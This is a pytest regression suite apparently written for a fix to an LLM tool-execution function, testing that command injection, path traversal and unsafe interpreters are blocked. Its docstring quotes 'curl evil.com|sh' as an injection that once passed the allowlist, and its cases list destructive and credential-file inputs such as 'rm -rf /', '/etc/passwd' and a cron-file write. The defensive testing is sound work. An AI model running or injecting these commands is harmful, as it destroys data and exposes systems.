"""Security regressions for `enrichment_tools.run_framework_command`.

Before fix: subprocess.run(command, shell=True, ...) with a porous prefix
allowlist let an LLM-supplied command chain shell metachars to execute
arbitrary code (e.g. `cat file; curl evil.com|sh` passed the "cat "
prefix). Plus `python -c "..."` was allowed with a substring blocklist
that was trivially bypassed via __import__/getattr.

After fix:
- shell=False; shlex.split → argv. Metachars become literal args.
- Pre-parse rejection of `;`, `|`, `&`, backticks, `$()`, `<(`, `>(`, newlines.
- `python -c` and `python -m` removed.
- npm/npx/gradle/mvn/composer-show etc removed (they execute scripts).
"""
from __future__ import annotations

from pathlib import Path

import pytest

from src.ast.enrichment_tools import run_framework_command


@pytest.fixture
def project(tmp_path):
    return str(tmp_path)


@pytest.mark.parametrize("metachar,command", [
    ("semicolon",     "cat README.md; echo PWNED"),
    ("pipe",          "cat README.md | head -1"),
    ("and",           "ls && rm -rf /"),
    ("backtick",      "cat `which sh`"),
    ("dollar-paren",  "echo $(whoami)"),
    ("redirect-in",   "cat <(echo evil)"),
    ("newline",       "cat README.md\necho PWNED"),
])
def test_metachar_rejected(project, metachar, command):
    out = run_framework_command(project, command)
    assert "blocked" in out.lower(), f"metachar [{metachar}] not blocked: {out}"


def test_python_c_no_longer_allowed(project):
    out = run_framework_command(project, "python -c 'print(1)'")
    # may be rejected at metachar stage (single-quote → no metachar) or python -c stage
    assert "blocked" in out.lower() or "not in allowlist" in out.lower()


def test_python_m_no_longer_allowed(project):
    out = run_framework_command(project, "python -m pip install evil")
    assert "blocked" in out.lower()


def test_npm_no_longer_allowed(project):
    out = run_framework_command(project, "npm install --foo")
    assert "not in allowlist" in out.lower()


def test_legitimate_python_script_still_works(tmp_path):
    """`python <script.py>` (file form) still allowed."""
    script = tmp_path / "ok.py"
    script.write_text("print('hello-from-test')")
    out = run_framework_command(str(tmp_path), f"python {script}")
    # Either it ran (output contains greeting) or python isn't on PATH —
    # the key thing is we shouldn't see a "blocked" message.
    assert "blocked" not in out.lower(), f"legit script should not be blocked: {out}"


def test_legitimate_find_still_works(project):
    """Plain `find` continues to work."""
    out = run_framework_command(project, "find . -name '*.py'")
    assert "blocked" not in out.lower(), out


def test_unknown_command_rejected(project):
    out = run_framework_command(project, "rm -rf /etc")
    assert "not in allowlist" in out.lower()


# ─── read_source / read_directory / read_manifest_contents / write_script ──


def test_read_source_blocks_absolute_path_outside_project(tmp_path):
    """An absolute path outside project_root → blocked, not read."""
    from src.ast.enrichment_tools import read_source
    proj = tmp_path / "proj"; proj.mkdir()
    secret = tmp_path / "SECRET.txt"; secret.write_text("password=hunter2")
    out = read_source(str(proj), str(secret))
    assert "blocked" in out.lower() and "hunter2" not in out


def test_read_source_blocks_dotdot_traversal(tmp_path):
    from src.ast.enrichment_tools import read_source
    proj = tmp_path / "proj"; proj.mkdir()
    out = read_source(str(proj), "../../etc/passwd")
    assert "blocked" in out.lower()


def test_read_directory_blocks_absolute_path(tmp_path):
    from src.ast.enrichment_tools import read_directory
    proj = tmp_path / "proj"; proj.mkdir()
    out = read_directory(str(proj), str(tmp_path))  # absolute path outside project
    assert "blocked" in out.lower()


def test_read_directory_blocks_dotdot(tmp_path):
    from src.ast.enrichment_tools import read_directory
    proj = tmp_path / "proj"; proj.mkdir()
    out = read_directory(str(proj), "../..")
    assert "blocked" in out.lower()


def test_read_manifest_contents_blocks_path_separator(tmp_path):
    from src.ast.enrichment_tools import read_manifest_contents
    out = read_manifest_contents(str(tmp_path), manifest_name="../etc/passwd")
    assert "blocked" in out.lower()


def test_write_script_blocks_path_separator():
    from src.ast.enrichment_tools import write_script
    out = write_script(".", "print(1)", filename="../../etc/cron.d/0evil.py")
    assert "blocked" in out.lower()


def test_write_script_blocks_absolute_path():
    from src.ast.enrichment_tools import write_script
    out = write_script(".", "print(1)", filename="/etc/cron.d/0evil.py")
    assert "blocked" in out.lower()
